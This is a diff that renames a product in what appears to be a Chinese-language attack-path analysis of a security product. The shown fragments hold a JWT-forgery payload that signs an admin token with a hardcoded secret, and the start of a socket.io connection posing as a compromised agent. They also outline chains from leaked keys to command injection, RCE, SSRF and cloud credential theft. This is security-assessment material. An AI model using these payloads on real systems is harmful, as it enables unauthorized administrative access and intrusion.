@@ -1,7 +1,7 @@
-# FluxGuard Pro - 攻击路径分析
+﻿# AetherGuard - 攻击路径分析
 
 **生成日期**: 2026-02-16
-**目标系统**: FluxGuard Pro v2.0.0
+**目标系统**: AetherGuard v2.0.0
 
 ---
 
@@ -47,7 +47,7 @@ GitHub泄露 → 硬编码密钥 → JWT伪造 → 命令注入 → RCE
 **Payload 示例**:
 ```bash
 # Step 1: 伪造 JWT Token
-export JWT_SECRET="FluxGuardJwtSecret_for_prod_2026_very_long_1234567890"
+export JWT_SECRET="AetherGuardJwtSecret_for_prod_2026_very_long_1234567890"
 node -e "const jwt = require('jsonwebtoken'); console.log(jwt.sign({userId: 'admin', role: 'admin'}, process.env.JWT_SECRET));"
 
 # Step 2: 命令注入
@@ -89,7 +89,7 @@ Agent API Key泄露 → Agent接管 → SSRF探测 → 云凭证获取 → 云�
 ```javascript
 // Step 1: WebSocket 连接
 const io = require('socket.io-client');
-const socket = io('ws://fluxguard:3005', {
+const socket = io('ws://AetherGuard:3005', {
   auth: {
     type: 'agent',
     agentId: 'compromised-agent-id',
